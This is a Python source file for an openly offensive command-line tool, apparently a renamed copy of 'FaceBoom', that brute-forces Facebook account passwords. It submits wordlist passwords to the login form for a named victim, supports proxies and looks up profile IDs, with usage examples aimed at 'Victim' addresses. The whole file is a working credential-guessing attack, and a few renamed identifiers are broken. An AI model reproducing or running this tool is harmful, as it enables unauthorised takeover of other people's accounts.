#!/usr/bin/python

import socket, sys, os, re, random, optparse, time, io
if sys.version_info.major <= 2:import httplib
else:import http.client as httplib

## COLORS ###############
wi="\033[1;37m" #>>White#
rd="\033[1;31m" #>Red   #
gr="\033[1;32m" #>Green #
yl="\033[1;33m" #>Yellow#
#########################
os.system("cls||clear")
def write(text):
    sys.stdout.write(text)
    sys.stdout.flush()

versionPath = os.path.join("core", "version.txt")

errMsg = lambda msg: write(rd+"\n["+yl+"!"+rd+"] Error: "+yl+msg+rd+ " !!!\n"+wi)

try:import requests
except ImportError:
    errMsg("[ requests ] module is missing")
    print("  [*] Please Use: 'pip install requests' to install it :)")
    sys.exit(1)
try:import mechanize
except ImportError:
    errMsg("[ mechanize ] module is missing")
    print("  [*] Please Use: 'pip install mechanize' to install it :)")
    sys.exit(1)

class FaceBoom(object):


    def __init__(self):
        self.useProxy = None
        self.br = mechanize.Browser()
        self.br.set_handle_robots(False)
        self.br._factory.is_html = True
        self.br.addheaders=[('User-agent',random.choice([
               'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
               'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
               'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
               'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
               'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']))]


    @staticmethod
    def check_proxy(proxy):
          proxies = {'https':"https://"+proxy, 'http':"http://"+proxy}
          proxy_ip = proxy.split(":")[0]
          try:
            r = requests.get('https://www.wikipedia.org',proxies=proxies, timeout=5)
            if proxy_ip==r.headers['X-Client-IP']: return True
            return False
          except Exception : return False


    @staticmethod
    def cnet():
        try:
            socket.create_connection((socket.gethostbyname("www.google.com"), 80), 2)
            return True
        except socket.error:pass
        return False


    def get_profile_id(self, target_profile):
        try:
            print(gr+"\n["+wi+"*"+gr+"] geting target Profile Id... please wait"+wi)
            idre = re.compile('(?<="userID":").*?(?=")')
            con = requests.get(target_profile).text
            idis = idre.search(con).group()
            print(wi+"\n["+gr+"+"+wi+"]"+gr+" Target Profile"+wi+" ID: "+yl+idis+wi)
        except Exception:
            errMsg("Please Check Your Victim's Profile URL")
            sys.exit(1)


    def login(self,target, password):

        try:
            self.br.open("https://facebook.com")
            self.br.select_form(nr=0)
            self.br.form['email']=target
            self.br.form['pass']= password
            self.br.method ="POST"
            if self.br.submit().get_data().__contains__(b'home_icon'):return  1
            elif "checkpoint" in self.br.geturl(): return 2
            return 0
        except(KeyboardInterrupt, EOFError):
            print(rd+"\n["+yl+"!"+rd+"]"+yl+" Aborting"+rd+"..."+wi)
            time.sleep(1.5)
            sys.exit(1)
        except Exception as e:
            print(rd+" Error: "+yl+str(e)+wi+"\n")
            time.sleep(0.60)


    def banner(self,target,wordlist,single_passwd):

        proxystatus = gr+self.useProxy+wi+"["+gr+"ON"+wi+"]" if self.useProxy  else yl+"["+rd+"OFF"+yl+"]"
        print(gr+"""
==================================
[---]   """+wi+"""FaceBook_hack"""+gr+"""        [---]
==================================
[---]  """+wi+"""BruteForce Facebook  """+gr+""" [---]
==================================
[---]         """+yl+"""CONFIG"""+gr+"""         [---]
==================================
[>] Target      :> """+wi+target+gr+"""
{}""".format("[>] Wordlist    :> "+yl+str(wordlist) if not single_passwd else "[>] Password    :> "+yl+str(single_passwd))+gr+"""
[>] ProxyStatus :> """+str(proxystatus)+wi)
        if not single_passwd:
            print(gr+"""\
=================================="""+wi+"""
[~] """+yl+"""Brute"""+rd+""" ForceATTACK: """+gr+"""Enabled """+wi+"""[~]"""+gr+"""
==================================\n"""+wi)
        else:print("\n")


    @staticmethod
    def updateFacebook_hack():
        if not os.path.isfile(versionPath):
             errMsg("Unable to check for updates: please re-clone the script to fix this problem")
             sys.exit(1)
        write("[~] Checking for updates...\n")
        conn = httplib.HTTPSConnection("raw.githubusercontent.com")
        conn.request("GET", "/Oseid/Facebook_hack/master/core/version.txt")
        repoVersion = conn.getresponse().read().strip().decode()
        with open(versionPath) as vf:
            currentVersion = vf.read().strip()
        if repoVersion == currentVersion:write("  [*] The script is up to date!\n")
        else:
                print("  [+] An update has been found ::: Updating... ")
                conn.request("GET", "/Oseid/FaceBook_hack/master/facebook_hack.py")
                newCode = conn.getresponse().read().strip().decode()
                with open("facebook_hack.py", "w") as  facebook_hackScript:
                   faceBook_hackScript.write(newCode)
                with open(versionPath, "w") as ver:
                     ver.write(repoVersion)
                write("  [+] Successfully updated :)\n")

parse = optparse.OptionParser(wi+"""
Usage: python facebook_hack.py [OPTIONS...]
-------------
OPTIONS:
       |
    |--------
    | -t <target email> [OR] <FACEBOOK ID>    ::> Specify target Email [OR] Target Profile ID
    |--------
    | -w <wordlist Path>                      ::> Specify Wordlist File Path
    |--------
    | -s <single password>                    ::> Specify Single Password To Check
    |--------
    | -p <Proxy IP:PORT>                      ::> Specify HTTP/S Proxy (Optional)
    |--------
    | -g <TARGET Facebook Profile URL>        ::> Specify Target Facebook Profile URL For Get HIS ID
    |--------
    | -u/--update                             ::> Update FaceBook_hack Script
-------------
Examples:
        |
     |--------
     | python facebook_hack.py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt
     |--------
     | python facebook_hack.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
     |--------
     | python facebook_hack.py -t Victim@hotmail.com -w D:\\wordlist.txt -p 144.217.101.245:3129
     |--------
     | python facebook_hack.py -t Victim@gmail.com -s 1234567
     |--------
     | python facebook_hack.py -g https://www.facebook.com/Victim_Profile
     |--------
""")


def Main():
   parse.add_option("-t","--target",'-T','--TARGET',dest="target",type="string",
      help="Specify Target Email or ID")
   parse.add_option("-w","--wordlist",'-W','--WORDLIST',dest="wordlist",type="string",
      help="Specify Wordlist File ")
   parse.add_option("-s","--single","--S","--SINGLE",dest="single",type="string",
      help="Specify Single Password To Check it")
   parse.add_option("-p","-P","--proxy","--PROXY",dest="proxy",type="string",
                        help="Specify HTTP/S Proxy to be used")
   parse.add_option("-g","-G","--getid","--GETID",dest="url",type="string",
                        help="Specify TARGET FACEBOOK PROFILE URL to get his ID")
   parse.add_option("-u","-U","--update","--UPDATE", dest="update", action="store_true", default=False)
   (options,args) = parse.parse_args()
   faceboom = FaceBoom()
   target = options.target
   wordlist = options.wordlist
   single_passwd = options.single
   proxy = options.proxy
   target_profile = options.url
   update = options.update
   opts = [target,wordlist,single_passwd, proxy, target_profile, update]
   if any(opt for opt in opts):
     if not faceboom.cnet():
       errMsg("Please Check Your Internet Connection")
       sys.exit(1)
   if update:
    facebook_hack.updateFaceBook_hack()
    sys.exit(1)
   elif target_profile:
        faceboom.get_profile_id(target_profile)
        sys.exit(1)
   elif wordlist or single_passwd:
        if wordlist:
            if not os.path.isfile(wordlist):
                errMsg("Please check Your Wordlist Path")
                sys.exit(1)
        if single_passwd:
            if len(single_passwd.strip()) < 6:
                errMsg("Invalid Password")
                print("[!] Password must be at least '6' characters long")
                sys.exit(1)
        if proxy:
             if proxy.count(".") != 3:
                    errMsg("Invalid IPv4 ["+rd+str(proxy)+yl+"]")
                    sys.exit(1)
             print(wi+"["+yl+"~"+wi+"] Connecting To "+wi+"Proxy[\033[1;33m {} \033[1;37m]...".format(proxy if not ":" in proxy else proxy.split(":")[0]))
             final_proxy = proxy+":8080" if not ":" in proxy else proxy
             if faceboom.check_proxy(final_proxy):
                faceboom.useProxy = final_proxy
                faceboom.br.set_proxies({'https':faceboom.useProxy, 'http':faceboom.useProxy})
                print(wi+"["+gr+"Connected"+wi+"]")
             else:
                errMsg("Connection Failed")
                errMsg("Unable to connect to Proxy["+rd+str(proxy)+yl+"]")
                sys.exit(1)

        faceboom.banner(target,wordlist,single_passwd)
        loop = 1 if not single_passwd else "~"
        if single_passwd:
            passwords = [single_passwd]
        else:
            with io.open(wordlist, 'r', errors='replace') as f:
                passwords = f.readlines()
        for passwd in passwords:
                passwd = passwd.strip()
                if len(passwd) <6:continue
                write(wi+"["+yl+str(loop)+wi+"] Trying Password[ {"+yl+str(passwd)+wi+"} ]")
                retCode = faceboom.login(target, passwd)
                if retCode:
                    sys.stdout.write(wi+" ==> Login"+gr+" Success\n")
                    print(wi+"========================="+"="*len(passwd)+"======")
                    print(wi+"["+gr+"+"+wi+"] Password [ "+gr+passwd+wi+" ]"+gr+" Is Correct :)")
                    print(wi+"========================="+"="*len(passwd)+"======")
                    if retCode == 2:print(wi+"["+yl+"!"+wi+"]"+yl+" Warning: This account use ("+rd+"2F Authentication"+yl+"):"+rd+" It's Locked"+yl+" !!!")
                    break
                else:
                    sys.stdout.write(yl+" ==> Login"+rd+" Failed\n")
                    loop = loop + 1 if not single_passwd else "~"
        else:
                if single_passwd:
                    print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"The Password[ "+yl+passwd+wi+" ] Is Not Correct"+rd+":("+yl+"!"+wi)
                    print(gr+"["+yl+"!"+gr+"]"+yl+" Please Try Another password or Wordlist "+gr+":)"+wi)
                else:
                    print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"I Can't Find The Correct Password In [ "+yl+wordlist+wi+" ] "+rd+":("+yl+"!"+wi)
                    print(gr+"["+yl+"!"+gr+"]"+yl+" Please Try Another Wordlist. "+gr+":)"+wi)
        sys.exit(1)
   else:
       print(parse.usage)
       sys.exit(1)

if __name__=='__main__':
    Main()
##############################################################
#####################                #########################
#####################   END OF TOOL  #########################
#####################                #########################
##############################################################
#This Tool by Oseid Aldary
#Have a nice day :)
#GoodBye
